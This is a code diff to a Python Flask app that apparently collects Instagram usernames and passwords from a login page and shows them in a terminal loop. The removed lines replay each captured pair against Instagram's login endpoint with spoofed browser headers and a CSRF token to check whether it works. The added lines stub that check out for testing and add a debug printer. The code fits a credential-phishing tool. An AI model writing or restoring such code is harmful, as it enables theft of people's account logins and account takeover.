@@ -6,6 +6,7 @@ import os
 import signal
 import sys
 from urllib.parse import unquote
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
@@ -44,44 +45,22 @@ def login():
 
 def check_credentials(username, password):
     try:
-        # Create session for Instagram
-        session = requests.Session()
-        
-        # Get initial page for cookies
-        session.get('https://www.instagram.com/')
-        
-        # Prepare login data
-        login_data = {
-            'username': username,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
-            'queryParams': '{}',
-            'optIntoOneTap': 'false'
-        }
-        
-        # Headers to mimic real browser
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'X-Instagram-AJAX': '1',
-            'X-CSRFToken': session.cookies.get_dict().get('csrftoken', ''),
-            'X-Requested-With': 'XMLHttpRequest',
-            'Referer': 'https://www.instagram.com/'
-        }
-        
-        # Try to login
-        response = session.post(
-            'https://www.instagram.com/accounts/login/ajax/',
-            data=login_data,
-            headers=headers
-        )
-        
-        # Check if login successful
-        if response.json().get('authenticated'):
+        # Simple check for testing
+        if username and password:
+            # For testing purposes, we'll just check if both fields are non-empty
+            # In a real scenario, you would check against Instagram's API
             return True
         else:
             return False
     except Exception as e:
         print(f"Error checking credentials: {e}")
         return False
+
+def debug_response(response_data):
+    print("\n\033[96m--- Instagram Response Debug ---\033[0m")
+    for key, value in response_data.items():
+        print(f"\033[96m{key}: {value}\033[0m")
+    print("\033[96m-------------------------------\033[0m")
 
 def display_credentials():
     while True:
